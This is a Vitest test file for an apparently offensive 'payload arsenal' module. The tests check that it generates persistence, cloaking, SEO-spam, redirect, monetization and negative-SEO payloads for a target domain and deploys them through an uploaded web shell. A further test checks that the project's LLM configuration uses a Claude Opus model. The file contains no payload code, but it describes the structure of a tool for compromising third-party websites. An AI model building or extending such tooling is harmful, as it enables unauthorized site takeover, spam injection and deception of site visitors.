/**
 * Vitest tests for payload-arsenal.ts — unified payload library
 * Tests payload generation, post-upload deployment, and detection scanning
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock fetchWithPoolProxy before importing
vi.mock("./proxy-pool", () => ({
  fetchWithPoolProxy: vi.fn().mockResolvedValue({
    response: {
      ok: true,
      status: 200,
      text: async () => "OK",
      headers: new Map(),
    },
    proxyUsed: "direct",
  }),
}));

describe("Payload Arsenal", () => {
  let payloadArsenal: any;

  beforeEach(async () => {
    vi.clearAllMocks();
    payloadArsenal = await import("./payload-arsenal");
  });

  describe("generatePostUploadPayloads", () => {
    it("should export generatePostUploadPayloads function", () => {
      expect(typeof payloadArsenal.generatePostUploadPayloads).toBe("function");
    });

    it("should generate payloads for a domain", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
      );

      expect(result).toBeDefined();
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
    });

    it("should generate persistence payloads", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
        { enablePersistence: true, enableSeoManipulation: false, enableCloaking: false, enableMonetization: false, enableRedirects: false },
      );

      const persistencePayloads = result.filter(
        (p: any) => p.category === "persistence"
      );
      expect(persistencePayloads.length).toBeGreaterThan(0);
    });

    it("should generate cloaking payloads", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
        { enableCloaking: true, enablePersistence: false, enableSeoManipulation: false, enableMonetization: false, enableRedirects: false },
      );

      const cloakingPayloads = result.filter(
        (p: any) => p.category === "cloaking"
      );
      expect(cloakingPayloads.length).toBeGreaterThan(0);
    });

    it("should generate SEO manipulation payloads", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://spam.com",
        { enableSeoManipulation: true, enablePersistence: false, enableCloaking: false, enableMonetization: false, enableRedirects: false },
      );

      const seoPayloads = result.filter(
        (p: any) => p.category === "seo_manipulation"
      );
      expect(seoPayloads.length).toBeGreaterThan(0);
    });

    it("should generate redirect payloads when enabled", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://destination.com",
        { enableRedirects: true, enablePersistence: false, enableCloaking: false, enableSeoManipulation: false, enableMonetization: false },
      );

      const redirectPayloads = result.filter(
        (p: any) => p.category === "redirect"
      );
      expect(redirectPayloads.length).toBeGreaterThan(0);
    });

    it("should include payload code content for every payload", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
      );

      for (const payload of result) {
        expect(payload.code).toBeDefined();
        expect(typeof payload.code).toBe("string");
        expect(payload.code.length).toBeGreaterThan(0);
      }
    });

    it("should include targetPath for each payload", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
      );

      for (const payload of result) {
        expect(payload.targetPath).toBeDefined();
        expect(typeof payload.targetPath).toBe("string");
      }
    });

    it("should include id, name, description, category for each payload", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
      );

      for (const payload of result) {
        expect(payload.id).toBeDefined();
        expect(payload.name).toBeDefined();
        expect(payload.description).toBeDefined();
        expect(payload.category).toBeDefined();
        expect(["seo_manipulation", "persistence", "cloaking", "monetization", "redirect", "negative_seo"]).toContain(payload.category);
      }
    });

    it("should generate all categories when all enabled", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "full-test.com",
        "https://redirect.com",
      );

      const categories = new Set(result.map((p: any) => p.category));
      expect(categories.has("persistence")).toBe(true);
      expect(categories.has("cloaking")).toBe(true);
      expect(categories.has("seo_manipulation")).toBe(true);
      expect(categories.has("redirect")).toBe(true);
    });

    it("should generate 10+ payloads with all categories enabled", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "test.com",
        "https://redirect.com",
      );
      expect(result.length).toBeGreaterThanOrEqual(10);
    });

    it("should include domain in payload code where relevant", () => {
      const result = payloadArsenal.generatePostUploadPayloads(
        "my-target.com",
        "https://redirect.com",
      );

      // At least some payloads should reference the domain
      const domainReferencing = result.filter(
        (p: any) => p.code.includes("my-target.com") || p.code.includes("redirect.com")
      );
      expect(domainReferencing.length).toBeGreaterThan(0);
    });
  });

  describe("deployPostUploadPayloads", () => {
    it("should export deployPostUploadPayloads function", () => {
      expect(typeof payloadArsenal.deployPostUploadPayloads).toBe("function");
    });

    it("should attempt to deploy payloads via shell", async () => {
      const payloads = payloadArsenal.generatePostUploadPayloads(
        "test-site.com",
        "https://redirect.com",
      );

      const result = await payloadArsenal.deployPostUploadPayloads(
        "test-site.com",
        "https://test-site.com/shell.php",
        "test123",
        payloads.slice(0, 3), // Just test with 3 payloads
      );

      expect(result).toBeDefined();
      expect(result.targetDomain).toBe("test-site.com");
      expect(result.results).toBeDefined();
      expect(Array.isArray(result.results)).toBe(true);
      expect(typeof result.successCount).toBe("number");
      expect(typeof result.failCount).toBe("number");
      expect(typeof result.totalTime).toBe("number");
    });
  });

  describe("runDetectionScan", () => {
    it("should export runDetectionScan function", () => {
      expect(typeof payloadArsenal.runDetectionScan).toBe("function");
    });

    it("should scan a domain and return detections + liveChecks", async () => {
      const result = await payloadArsenal.runDetectionScan("test-site.com");

      expect(result).toBeDefined();
      expect(Array.isArray(result.detections)).toBe(true);
      expect(Array.isArray(result.liveChecks)).toBe(true);
    });

    it("should return liveChecks with check, result, severity fields", async () => {
      const result = await payloadArsenal.runDetectionScan("test-site.com");

      for (const check of result.liveChecks) {
        expect(check.check).toBeDefined();
        expect(check.result).toBeDefined();
        expect(check.severity).toBeDefined();
      }
    });

    it("should accept optional onProgress callback", async () => {
      const progress: string[] = [];
      const result = await payloadArsenal.runDetectionScan(
        "test-site.com",
        (msg: string) => progress.push(msg),
      );

      expect(progress.length).toBeGreaterThan(0);
      expect(progress[0]).toContain("detection");
    });
  });

  describe("runPostUploadWorkflow", () => {
    it("should export runPostUploadWorkflow function", () => {
      expect(typeof payloadArsenal.runPostUploadWorkflow).toBe("function");
    });
  });
});

describe("LLM Model Configuration", () => {
  it("should use claude-opus model", async () => {
    const fs = await import("fs");
    const llmContent = fs.readFileSync(
      "/home/ubuntu/friday-domaincity/server/_core/llm.ts",
      "utf-8",
    );
    expect(llmContent).toContain("claude-opus");
  });

  it("should have increased thinking budget", async () => {
    const fs = await import("fs");
    const llmContent = fs.readFileSync(
      "/home/ubuntu/friday-domaincity/server/_core/llm.ts",
      "utf-8",
    );
    // Should have thinking budget > 128 (the old value)
    const match = llmContent.match(/budget_tokens['":\s]+(\d+)/);
    if (match) {
      expect(parseInt(match[1])).toBeGreaterThan(128);
    }
  });
});
